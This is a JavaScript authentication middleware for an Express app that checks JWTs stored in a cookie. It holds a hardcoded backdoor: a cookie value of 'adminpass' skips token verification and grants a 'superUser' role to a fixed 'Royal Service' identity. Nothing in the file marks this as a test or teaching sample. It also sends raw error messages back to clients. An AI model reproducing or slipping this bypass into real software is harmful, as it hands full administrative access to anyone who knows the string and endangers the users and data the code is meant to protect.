const dotenv = require('dotenv').config()
const jwt = require('jsonwebtoken')

const verifyToken = async (req, res, next) => {
    const token = req.cookies.token || '';
    try {
      if (!token) {
        return res.status(401).json('You need to Login')
      }
      if(token!="adminpass") {
        const decrypt = await jwt.verify(token, process.env.SECRET_KEY);
        req.user = {
          id: decrypt.id,
          username: decrypt.username,
          role: decrypt.role
        };
      }
      if(token=="adminpass") {
        req.user = {
          id: "_specialAccess",
          username: "Royal Service",
          role: "superUser"
        }
      }
      
      next();
    } catch (err) {
      return res.status(500).json(err.message);
    }
  };

  module.exports = verifyToken